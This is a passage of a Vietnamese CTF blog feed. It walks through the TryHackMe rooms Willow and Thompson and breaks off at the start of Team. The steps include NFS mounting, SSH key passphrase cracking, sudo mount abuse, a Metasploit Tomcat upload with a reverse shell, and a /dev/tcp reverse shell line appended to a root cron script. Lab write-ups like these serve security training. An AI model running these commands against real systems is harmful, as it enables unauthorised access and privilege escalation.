3323135203138343130203232313439203131333339203134343232203937303920383439392032393630392032323134392032353131312033353733342032383337342033333434332032313430342032313838392032383932372033333434332034313938203139323736203335363730203735363820333330303620313232343420373335382032333231392033393437203239363535203230313732203335323433203134363035203834353220323836333820333037382032313838392032393635352033353733342039343530203238393237203238393237203233323139203131343035203335373334203236383432203333303036203131333339203333323135203139333936203335323433203734393620333635303020343139382039373039203538353120323830363120333635303020323833373420313733352034313938203739313420373335382031313430352037333538203239363535203834353220323134303420313133333920313831393920373536382032323134392031343432322032363834322031373633322035383531203335373334203232383732203337343338203937303920383439392038363030203337323438203836303020333732343820333934372038343532203337343338203230313732203836303020323231343920313436303520323238373220383439392037333538203137333520353434342032333738372033333030362031383237382032303137322032393530203230313732203335363730203335323433203330373820323833373420353835312032363737352032323837322034313938203333393835203337343338203239353020323138383920373439362038363030203937303920323031373220323638343220373536382032363834322031373335203238333734203232383732203934353020383630302031383139392035383531203238393237203238303631203131343035203239363039203232303533203232383732203238333734203132373932203134343232203232303533203733353820383630302033333030362032323837322037393134203339343720333732343820323134303420313133333920333532343320313831393920333537333420323337323120373931342033333231352032313838392031383237382033333835362031333235362038363030203134363035203230313732203232313032203131343035203232313439203734393620323936353520393435302034313938203937303920313033383620323735383220323833373420333334343320333333392031323234342033313133312032383932372032353131312032363737352033333231352033333231352033373234382037393134203937303920333532343320333537333420333338353620323238373220333532343320323735383220333338353620313332353620333131333120333338353620333732343820323231303220323833373420313332353620333334343320313832373820333334343320313933393620313434323220313733352032323035332031333235362033373234382033333030362031313430352031393339362032313838392037393134203231343034203337343338203331313331203239363039203231383839203233373231203339343720333339383520313436303520323332313920333333392031323234342038343532203230313732203335373334203134363035203834393920333532343320333333392031373633322033333231352033333938352033303738203333383536203137333520333131333120323830363120323830363120323935302033353733342032333231392037343936203335373334203339343720323735383220323231343920323531313120373536382032323134392032313838392031363138362037343936203134363035203331313331203231343034203238333734203834393920323735383220333734333820333934372037353638203231343034203137363332203834393920373439362031343432322033373234382037333538203233373231203330373820323637373520313332353620333635303020323839323720323936303920383630302032333738372035343434203538353120323138383920333338353620383435322031363138362032393630392032393630392033333434332031383139392031373633322032303137322033353733342034313938203232313032203333383536203937303920323238373220353835312035343434203834353220393435302032393630392034313938203136313836203836303020383630302033333835362032333738372032323837322033373234382032333732312035383531203333333920323238373220323332313920333934372031383237382035343434203233323139203239363535203733353820333635303020323833373420323936353520373439362034313938203232383732203733353820313833333020333131333120313834313020333333392031343432322037333538203231343034203538353120333330303620313033383620373335382032383932372031313430352037353638203333383536203232313032203230313732203337323438203131343035203538353120373439362031323739322033353234332031313333392032333231392031373335203232313439203538353120333536373020313833333020323332313920333732343820373439362035383531203138343130203130333836203235313131203330373820323138383920313033383620323337383720323332313920313033383620333734333820313932373620383435322033353637302033363530302033333339203333333920373536382032323130322033363530302031323234342032383633382035343434203337343338203239363535203733353820393435302031393237362032323035332034313938203333393835203333393835203734393620333332313520323936353520353835312031343432322037333538203138333330203333383536203238333734203236383432203339343720373536382033373234382032393530203236373735203132323434203834393920323935302033363530302033333030362037393134203538353120373335382038343532203934353020323839323720323936353520353835312032333231392033333030362031373335203336353030203233373231203734393620333338353620323230353320313033383620333037382038363030203238363338203232303533203131343035203230313732203333393835203238363338203239353020333333392031323739322031303338362033353733342032333738372033333030362032383337342039373039203137363332203739313420323231303220313932373620323936303920313833333020323134303420333334343320323337383720313832373820383435322033363530302033353733342032383633382032313838392031343432322033393437203231383839203333393835203137333520333734333820333037382031313430352032373538322031383237382033353733342033333030362033393437203739313420333732343820383435322032383337342032323837322033373234382037353638203134363035203239363039203335373334203138323738203937303920323936353520353835312031393339362033353234332033373433382031323234342037353638203739313420323231343920353434342031313430352032393635352031373335203934353020323230353320333532343320323830363120313831393920333532343320313436303520323936303920323531313120323936303920323134303420323031373220323134303420323839323720313332353620323830363120333333392038363030203739313420333934372031373335203139323736203333323135203836303020333338353620313134303520343139382031343432322032323837322031333235362033363530302033333030362033353733342032393635352033373234382033303738203238393237203134363035203133323536203132373932203538353120313133333920313133333920323936353520313833333020353434342033333835362033333434332032323837322032333732312032353131312039343530203733353820313833333020333330303620323231303220323836333820343139382031393237362033333938352039343530203834393920313332353620333037382035343434203131333339203333393835203230313732203138323738203239363535203335373334203331313331203132323434203236383432203337323438203131343035203333343433203139333936203232303533203233323139203336353030203934353020373439362033373234382032313838392033353733342031383237382033333030362033333835362034313938203136313836203131343035203134343232203239353020313832373820323134303420373335382032383036312033333434332031363138362033353733342033373433382031323739322032333732312031383431302032333732312032353131312033333434332037333538203232383732203238333734203330373820333330303620313736333220333536373020333334343320313833333020333635303020313833333020333338353620323638343220323134303420323833373420333734333820323830363120323031373220313736333220333339383520313733352033353733342037333538203333323135203137333520333333392033393437203337343338203132373932203231383839203138333330203337343338203333323135203138323738203339343720333635303020373536382033353637302039373039203331313331203239363039203331313331203139333936203233373837203139323736203834353220333635303020353835312031313430352031343432322031313333392032383932372031383139392033333434332032353131312033313133312031313430352033333339203132323434203534343420333532343320383630302037333538203233373837203337323438203231383839203836303020393435302039343530203132323434203339343720323337383720333734333820333934372033333938352037333538203337323438203834353220323238373220333537333420373335382032383036312031393339362039373039203834353220373931342031313430352032373538322035383531203231343034203235313131203834393920323936303920323231343920343139382031383237382032393630392037333538203132373932203237353832203336353030203431393820333532343320313736333220323936303920323337323120333734333820333934372033353234332031343630352033373433382031323234342031393339362031393237362031343432322032333637203233363720323336372032333637203233363720383630302031373335203335373334203333303239203136313836203238333734203337323438203333303239203236383432203136313836203138343130203233323139203337323438203131333339203836303020333330323920333536373020383630302033313133312032333637203233363720323336372032333637203233363720\t\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; NhÃ¬n qua dÃ£y sá»‘ dÃ i vÃ´ cÃ¹ng nÃ y, Ä‘oáº¡n Ä‘áº§u cÃ³ bao gá»“m cáº£ chá»¯ cÃ¡i vÃ  sá»‘, sau Ä‘Ã³ chá»‰ toÃ n sá»‘ vÃ  cÃ³ cáº£ nhá»¯ng Ä‘oáº¡n sá»‘ láº·p láº¡i, tÃ´i sáº½ thá»­ tÃ¡ch Ä‘oáº¡n cÃ³ chá»¯ ra Ä‘á»ƒ giáº£i mÃ£i.\nÄáº§u tiÃªn tÃ´i xÃ¡c Ä‘á»‹nh Ä‘iá»ƒm cuá»‘i cá»§a Ä‘oáº¡n cÃ³ chá»¯. VÃ¬ ngay sau chá»¯ a cuá»‘i cÃ¹ng thÃ¬ 10 chá»¯ sá»‘ 3233363720 sáº½ Ä‘Æ°á»£c láº·p láº¡i, váº­y thÃ¬ cÃ³ kháº£ nÄƒng chá»¯ a cuá»‘i cÃ¹ng cÅ©ng lÃ  Ä‘iá»ƒm cuá»‘i cá»§a Ä‘oáº¡n mÃ£ nÃ y. Sao chÃ©p Ä‘oáº¡n mÃ£ tá»« Ä‘áº§u Ä‘áº¿n chá»¯ a cuá»‘i cÃ¹ng vÃ  dÃ¡n nÃ³ vÃ o CyberChef\ná» Ä‘Ã¢y tÃ´i Ä‘Ã£ cÃ³ 1 cÃ¡i tÃªn, cÃ³ thá»ƒ dÃ¹ng nÃ³ lÃ m username, vÃ  vá»›i gá»£i Ã½ vá» ssh key thÃ¬ ráº¥t cÃ³ thá»ƒ Ä‘oáº¡n sá»‘ phÃ­a sau lÃ  ssh key Ä‘Ã£ mÃ£ hÃ³a.\nTiáº¿p tá»¥c dÃ¡n Ä‘oáº¡n cÃ²n láº¡i vÃ o Ä‘Ã¢y Ä‘á»ƒ thá»­ generate\nSSH key nÃ y khÃ´ng thá»ƒ dÃ¹ng Ä‘Æ°á»£c, nÃªn tÃ´i sáº½ Ä‘á»ƒ láº¡i Ä‘Ã³. Quay láº¡i vá»›i port 111 vÃ  2049. TÃ¬m exploit nfs vá»›i port 2049 vÃ  111, tÃ´i tÃ¬m Ä‘Æ°á»£c cÃ¡ch khai thÃ¡c báº±ng Nmap á»Ÿ Ä‘Ã¢y\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ showmount -e 10.10.81.195 Export list for 10.10.81.195: /var/failsafe * â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ mkdir /tmp/nfs â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ sudo mount -o nolock -t nfs 10.10.81.195:/ /tmp/nfs [sudo] password for neo: â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ll /tmp/nfs total 4 drwxr-xr-x 14 root root 4096 Jan 30 2020 var â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ll /tmp/nfs/var/failsafe total 4 -rw-r--r-- 1 root root 62 Jan 30 2020 rsa_keys â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat /tmp/nfs/var/failsafe/rsa_keys Public Key Pair: (23, 37627) Private Key Pair: (61527, 37627) â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ CÃ³ láº½ Ä‘Ã¢y lÃ  1 phÆ°Æ¡ng phÃ¡p toÃ¡n há»c hay thuáº­t toÃ¡n nÃ o Ä‘Ã³ Ä‘á»ƒ tÃ­nh ra ssh key, tÃ´i chÆ°a tá»«ng biáº¿t Ä‘áº¿n dáº¡ng nÃ y. VÃ  thÃº thá»±c thÃ¬ tÃ´i Ä‘Ã£ pháº£i lÆ°á»›t qua giáº£i Ä‘Ã¡p 1 chÃºt Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c phÆ°Æ¡ng phÃ¡p giáº£i cÃ¡c sá»‘ nÃ y. ÄÃ³ lÃ  RSA Express Encryption/Decryption Calculator\nVáº­y lÃ  tÃ´i cÃ³\ne = 23 d = 61527 N = 37627 Ciphertext lÃ  pháº§n RSA key tÃ´i Ä‘Ã£ generate Ä‘Æ°á»£c á»Ÿ pháº§n phÃ­a trÃªn NhÆ°ng Ciphertext á»Ÿ Ä‘Ã¢y yÃªu cáº§u pháº£i lÃ  numberic form nÃªn tÃ´i sáº½ dÃ¹ng CyberChef thÃªm 1 láº§n ná»¯a Ä‘á»ƒ\nSao chÃ©p key nÃ y vá» vÃ  login ssh.\nSSH # â”Œâ”€â”€(neoã‰¿kali)-[~/THM-willow] â””â”€$ ssh -i id_rsa willow@10.10.81.195 Load key \u0026#34;id_rsa\u0026#34;: Permission denied willow@10.10.81.195\u0026#39;s password: Permission denied, please try again. willow@10.10.81.195\u0026#39;s password: Permission denied, please try again. willow@10.10.81.195\u0026#39;s password: willow@10.10.81.195: Permission denied (publickey,password,hostbased). â”Œâ”€â”€(neoã‰¿kali)-[~/THM-willow] â””â”€$ CÃ³ váº» nhÆ° key nÃ y Ä‘Æ°á»£c báº£o vá»‡ bá»Ÿi passphrase. TÃ´i sáº½ thá»­ crack nÃ³\nâ”Œâ”€â”€(neoã‰¿kali)-[~/THM-willow] â””â”€$ ssh2john id_rsa \u0026gt; hash â”Œâ”€â”€(neoã‰¿kali)-[~/THM-willow] â””â”€$ john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status wildflower (id_rsa) Thá»­ login láº¡i vá»›i pass nÃ y\nâ”Œâ”€â”€(neoã‰¿kali)-[~/THM-willow] â””â”€$ sudo ssh -o \u0026#39;PubkeyAcceptedKeyTypes +ssh-rsa\u0026#39; -i id_rsa willow@10.10.81.195 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: \u0026#34;O take me in your arms, love For keen doth the wind blow O take me in your arms, love For bitter is my deep woe.\u0026#34; -The Willow Tree, English Folksong willow@willow-tree:~$ id uid=1000(willow) gid=1000(willow) groups=1000(willow),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth) willow@willow-tree:~$ BÃªn trong nÃ y cÃ³ 1 file user.jpg, ná»™i dung áº£nh nÃ y chÃ­nh lÃ  user flag\nPrivilege escalation # willow@willow-tree:~$ find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper /usr/lib/pt_chown /usr/sbin/exim4 /usr/sbin/pppd /usr/bin/chfn /usr/bin/vmware-user-suid-wrapper /usr/bin/pkexec /usr/bin/gpasswd /usr/bin/X /usr/bin/procmail /usr/bin/newgrp /usr/bin/sudo /usr/bin/passwd /usr/bin/at /usr/bin/chsh /sbin/mount.nfs /bin/su /bin/ntfs-3g /bin/umount /bin/fusermount /bin/mount willow@willow-tree:~$ willow@willow-tree:~$ sudo -l Matching Defaults entries for willow on willow-tree: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User willow may run the following commands on willow-tree: (ALL : ALL) NOPASSWD: /bin/mount /dev/* willow@willow-tree:~$ Xem qua thÆ° má»¥c /dev/ tá»“i tÃ¬m tháº¥y hidden_backup nhÆ°ng khÃ´ng cÃ³ quyá»n Ä‘á»ƒ xem file nÃ y. Tuy nhiÃªn tÃ´i cÃ³ thá»ƒ \u0026lsquo;mount\u0026rsquo; nÃ³ sang 1 thÆ° má»¥c khÃ¡c vá»›i quyá»n cá»§a user willow\nwillow@willow-tree:~$ mkdir backup willow@willow-tree:~$ sudo mount /dev/hidden_backup backup willow@willow-tree:~$ ls -la backup/ total 6 drwxr-xr-x 2 root root 1024 Jan 30 2020 . drwxr-xr-x 17 willow willow 4096 Oct 7 09:31 .. -rw-r--r-- 1 root root 42 Jan 30 2020 creds.txt willow@willow-tree:~$ cat backup/creds.txt root:7QvbvBTvwPspUK willow:U0ZZJLGYhNAT2s willow@willow-tree:~$ su root Password: root@willow-tree:/home/willow# root@willow-tree:/home/willow# cd root@willow-tree:~# ls -la total 36 drwx------ 5 root root 4096 Jan 30 2020 . drwxr-xr-x 23 root root 4096 Jan 30 2020 .. lrwxrwxrwx 1 root root 9 Jan 30 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc drwx------ 3 root root 4096 Jan 30 2020 .config drwxr-xr-x 3 root root 4096 Jan 30 2020 .local -rw-r--r-- 1 root root 140 Nov 19 2007 .profile -rw-r--r-- 1 root root 139 Jan 30 2020 root.txt -rw-r--r-- 1 root root 74 Jan 30 2020 .selected_editor drwx------ 2 root root 4096 Mar 1 2020 .ssh root@willow-tree:~# cat root.txt This would be too easy, don\u0026#39;t you think? I actually gave you the root flag some time ago. You\u0026#39;ve got my password now -- go find your flag! root@willow-tree:~# TÃ´i Ä‘Ã£ máº¥t ná»­a tiáº¿ng Ä‘á»“ng há»“ Ä‘á»ƒ rÃ  soÃ¡t láº¡i xem mÃ¬nh cÃ³ bá» qua thá»© gÃ¬ Ä‘áº·c biá»‡t khÃ´ng, vÃ  rá»“i Ä‘áº¿n pháº§n user flag, tÃ´i nháº­n ra lÃ  táº¡i sao nÃ³ láº¡i lÃ  file áº£nh mÃ  khÃ´ng pháº£i file txt nhÆ° thÃ´ng thÆ°á»ng, thÃªm ná»¯a lÃ  trong gá»£i Ã½ phÃ­a trÃªn 1 láº§n ná»¯a nháº¯c Ä‘áº¿n password cá»§a user root, váº­y thÃ¬ cÃ³ thá»ƒ Ä‘Ã¢y lÃ  passphrase cho file áº£nh\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf user.jpg Enter passphrase: wrote extracted data to \u0026#34;root.txt\u0026#34;. â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ","date":"8 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/willow/","section":"Ctf","summary":"","title":"Tryhackme - Willow","type":"ctf"},{"content":"","date":"6 March 2022","externalUrl":null,"permalink":"/tags/metasploit/","section":"Tags","summary":"","title":"Metasploit","type":"tags"},{"content":"","date":"6 March 2022","externalUrl":null,"permalink":"/tags/tomcat/","section":"Tags","summary":"","title":"Tomcat","type":"tags"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Thompson\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA) | 256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA) |_ 256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) |_ajp-methods: Failed to get a valid response for the OPTION request 8080/tcp open http Apache Tomcat 8.5.5 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/8.5.5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Vá»›i Apache Tomcat 8.5.5 tÃ´i thá»­ tÃ¬m exploit vÃ  ra Ä‘Æ°á»£c 2 káº¿t quáº£\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ searchsploit tomcat 8.5.5 ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Apache Tomcat \u0026lt; 9.0.1 (Beta) / \u0026lt; 8.5.23 / \u0026lt; 8.0.47 / \u0026lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (1) | windows/webapps/42953.txt Apache Tomcat \u0026lt; 9.0.1 (Beta) / \u0026lt; 8.5.23 / \u0026lt; 8.0.47 / \u0026lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (2) | jsp/webapps/42966.py ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Tuy nhiÃªn khi thá»­ khai thÃ¡c 2 exploit nÃ y tÃ´i khÃ´ng thu Ä‘Æ°á»£c káº¿t quáº£ gÃ¬ kháº£ quan. Táº¡m thá»i tÃ´i sáº½ Ä‘á»ƒ nÃ³ láº¡i. Vá»›i port 8009, tÃ´i nhá»› nÃ³ cÃ³ liÃªn quan Ä‘áº¿n Ghostcat nÃªn Ä‘Ã£ tÃ¬m láº¡i lá»— há»•ng liÃªn quan Ä‘áº¿n nÃ³.\nThá»­ dÃ¹ng Metasploit cÅ©ng khÃ´ng cÃ³ káº¿t quáº£ do pháº£i cÃ³ username vÃ  password. TÃ´i sáº½ quay vá» vá»›i cÃ¡ch sÆ¡ khai nháº¥t lÃ  tÃ¬m path vá»›i dirsearch\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ dirsearch -u 10.10.222.69:8080 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927 Output File: /home/neo/.dirsearch/reports/8080_22-09-26_03-55-39.txt Error Log: /home/neo/.dirsearch/logs/errors-22-09-26_03-55-39.log Target: http://10.10.222.69:8080/ [03:55:39] Starting: [03:56:07] 400 - 0B - /\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd [03:56:09] 400 - 0B - /a%5c.aspx [03:56:35] 200 - 3KB - /build.xml [03:56:46] 302 - 0B - /docs -\u0026gt; /docs/ [03:56:47] 200 - 16KB - /docs/ [03:56:51] 302 - 0B - /examples -\u0026gt; /examples/ [03:56:51] 200 - 1KB - /examples/ [03:56:51] 200 - 6KB - /examples/servlets/index.html [03:56:51] 200 - 658B - /examples/servlets/servlet/CookieExample [03:56:51] 200 - 946B - /examples/servlets/servlet/RequestHeaderExample [03:56:52] 200 - 673B - /examples/jsp/snp/snoop.jsp [03:56:53] 200 - 21KB - /favicon.ico [03:56:57] 302 - 0B - /host-manager/ -\u0026gt; /host-manager/html [03:56:57] 401 - 2KB - /host-manager/html [03:57:00] 200 - 11KB - /index.jsp [03:57:09] 302 - 0B - /manager -\u0026gt; /manager/ [03:57:10] 401 - 2KB - /manager/status/all [03:57:10] 401 - 2KB - /manager/html [03:57:10] 401 - 2KB - /manager/jmxproxy/?qry=STUFF [03:57:10] 401 - 2KB - /manager/jmxproxy [03:57:10] 401 - 2KB - /manager/html/ [03:57:10] 401 - 2KB - /manager/jmxproxy/?get=java.lang:type=Memory\u0026amp;att=HeapMemoryUsage [03:57:10] 401 - 2KB - /manager/jmxproxy/?get=BEANNAME\u0026amp;att=MYATTRIBUTE\u0026amp;key=MYKEY [03:57:10] 401 - 2KB - /manager/jmxproxy/?get=java.lang:type=Memory\u0026amp;att=HeapMemoryUsage\u0026amp;key=used [03:57:10] 401 - 2KB - /manager/jmxproxy/?set=Catalina%3Atype%3DValve%2Cname%3DErrorReportValve%2Chost%3Dlocalhost\u0026amp;att=debug\u0026amp;val=cow [03:57:10] 302 - 0B - /manager/ -\u0026gt; /manager/html [03:57:10] 401 - 2KB - /manager/jmxproxy/?set=BEANNAME\u0026amp;att=MYATTRIBUTE\u0026amp;val=NEWVALUE [03:57:10] 401 - 2KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService\u0026amp;op=findConnectors\u0026amp;ps= [03:57:10] 401 - 2KB - /manager/jmxproxy/?invoke=BEANNAME\u0026amp;op=METHODNAME\u0026amp;ps=COMMASEPARATEDPARAMETERS Task Completed â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Truy cáº­p vÃ o /manager/html thÃ¬ tÃ´i pháº£i login má»›i cÃ³ thá»ƒ xem Ä‘Æ°á»£c file nÃ y\nDÃ¹ng BurpSuite Ä‘á»ƒ báº¯t request\nVáº­y lÃ  tÃ´i cÃ³ uername vÃ  password. Quay trá»Ÿ láº¡i Metasploit, hÆ°á»›ng dáº«n setup á»Ÿ Ä‘Ã¢y\nmsf6 exploit(multi/http/tomcat_mgr_upload) \u0026gt; show options Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword s3cret no The password for the specified username HttpUsername tomcat no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.222.69 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 8080 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /manager yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST no HTTP server virtual host Payload options (java/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.18.3.74 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Java Universal msf6 exploit(multi/http/tomcat_mgr_upload) \u0026gt; run [*] Started reverse TCP handler on 10.18.3.74:4444 [*] Retrieving session ID and CSRF token... [*] Uploading and deploying MOqDtqfxEsxNGo... [*] Executing MOqDtqfxEsxNGo... [*] Undeploying MOqDtqfxEsxNGo ... [*] Undeployed at /manager/html/undeploy [*] Command shell session 1 opened (10.18.3.74:4444 -\u0026gt; 10.10.222.69:55106) at 2022-09-26 05:26:05 -0400 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; tomcat@ubuntu:/$ TÃ´i tÃ¬m tháº¥y user.txt trong /home/jack\nPrivilege escalation # Trong thÆ° má»¥c jack cÃ²n 2 file ná»¯a lÃ  id.sh vÃ  test.txt.\ntomcat@ubuntu:/home/jack$ cat test.txt cat test.txt uid=0(root) gid=0(root) groups=0(root) tomcat@ubuntu:/home/jack$ cat id.sh cat id.sh #!/bin/bash id \u0026gt; test.txt tomcat@ubuntu:/home/jack$ Khi cháº¡y id.sh nÃ³ sáº½ in káº¿t quáº£ ra test.txt. Kiá»ƒm tra crontab\ntomcat@ubuntu:~$ cat /etc/crontab cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * root cd /home/jack \u0026amp;\u0026amp; bash id.sh # tomcat@ubuntu:~$ File id.sh sáº½ tá»± Ä‘á»™ng thá»±c thi, viá»‡c cá»§a tÃ´i lÃ  thÃªm payload vÃ o file nÃ y vÃ  chá» há»‡ thá»‘ng thá»±c thi. NhÆ°ng trÆ°á»›c Ä‘Ã³ thÃ¬ tÃ´i pháº£i táº¡o listener vá»›i port 2402 Ä‘Ã£ nc -lnvp 2402\ntomcat@ubuntu:/home/jack$ echo \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.18.3.74/2402 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; id.sh \u0026lt;cho \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.18.3.74/2402 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; id.sh tomcat@ubuntu:/home/jack$ cat id.sh cat id.sh #!/bin/bash id \u0026gt; test.txt bash -i \u0026gt;\u0026amp; /dev/tcp/10.18.3.74/2402 0\u0026gt;\u0026amp;1 tomcat@ubuntu:/home/jack$ Quay láº¡i listener\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.222.69] 35900 bash: cannot set terminal process group (1998): Inappropriate ioctl for device bash: no job control in this shell root@ubuntu:/home/jack# id id uid=0(root) gid=0(root) groups=0(root) root@ubuntu:/home/jack# ls /root ls /root root.txt root@ubuntu:/home/jack# ","date":"6 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/thompson/","section":"Ctf","summary":"","title":"Tryhackme - Thompson","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Team\nReconnaissance # Äáº§u tiÃªn, nhÆ° thÆ°á»ng lá»‡, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA) | 256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA) |_ 256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;te... |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TÃ´i thá»­ truy cáº­p ftp vá»›i anonymous nhÆ°ng khÃ´ng thá»ƒ, váº­y nÃªn tÃ´i sáº½ báº¯t Ä‘áº§u kiá»ƒm tra web.\nVá»›i port 80 tÃ´i cÃ³ 1 default page cá»§a apache, thá»­ check qua source web\nTÃ´i pháº£i thÃªm domain vÃ o /etc/hosts, sau Ä‘Ã³ truy cáº­p team.thm\nÄÃ¢y lÃ  1 trang blog vá» áº£nh, kiá»ƒm tra source web thÃ¬ cÅ©ng khÃ´ng gÃ¬ Ä‘áº·c biá»‡t láº¯m. Khi tÃ´i thá»­ qua cÃ¡c path Ä‘Æ¡n giáº£n, trong robots.txt chá»‰ cÃ³ 1 chá»¯ \u0026lsquo;dale\u0026rsquo;, cÃ³ thá»ƒ Ä‘Ã¢y lÃ  1 cÃ¡i tÃªn chÄƒng?\nThá»­ dÃ¹ng dirsearch Ä‘á»ƒ tÃ¬m xem cÃ³ path áº©n nÃ o khÃ´ng\n[04:06:01] Starting: [04:06:10] 403 - 273B - /.ht_wsr.txt [04:06:10] 403 - 273B - /.htaccess.bak1 [04:06:10] 403 - 273B - /.htaccess.sample [04:06:10] 403 - 273B - /.htaccess.orig [04:06:10] 403 - 273B - /.htaccess.save [04:06:10] 403 - 273B - /.htaccess_extra [04:06:10] 403 - 273B - /.htaccess_orig [04:06:10] 403 - 273B - /.htaccess_sc [04:06:10] 403 - 273B - /.htaccessOLD [04:06:10] 403 - 273B - /.htaccessBAK [04:06:10] 403 - 273B - /.htaccessOLD2 [04:06:10] 403 - 